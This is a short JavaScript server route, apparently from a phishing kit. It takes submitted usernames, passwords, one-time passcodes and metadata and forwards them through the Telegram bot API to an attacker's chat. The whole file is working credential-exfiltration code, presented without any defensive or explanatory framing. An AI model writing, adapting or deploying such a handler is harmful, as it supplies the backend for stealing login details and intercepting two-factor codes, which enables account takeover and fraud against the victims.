export async function POST(req) {
  try {
    const body = await req.json();
    const { type, flowId, username, password, otp, meta } = body || {};

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
      return new Response(
        JSON.stringify({
          ok: false,
          error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
        }),
        { status: 500 }
      );
    }

    const parts = [
      `Flow: ${flowId || "(no-id)"}`,
      `Type: ${type}`,
      username ? `Username: ${username}` : null,
      password ? `Password: ${password}` : null,
      otp ? `OTP: ${otp}` : null,
      meta ? `Meta: ${JSON.stringify(meta)}` : null,
    ].filter(Boolean);

    const text = parts.join("\n");
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const telegramResp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
      cache: "no-store",
    });

    const data = await telegramResp.json();
    if (!telegramResp.ok || !data?.ok) {
      return new Response(
        JSON.stringify({
          ok: false,
          error: data?.description || "Telegram error",
        }),
        { status: 500 }
      );
    }
    return Response.json({ ok: true });
  } catch (e) {
    return new Response(JSON.stringify({ ok: false, error: String(e) }), {
      status: 500,
    });
  }
}
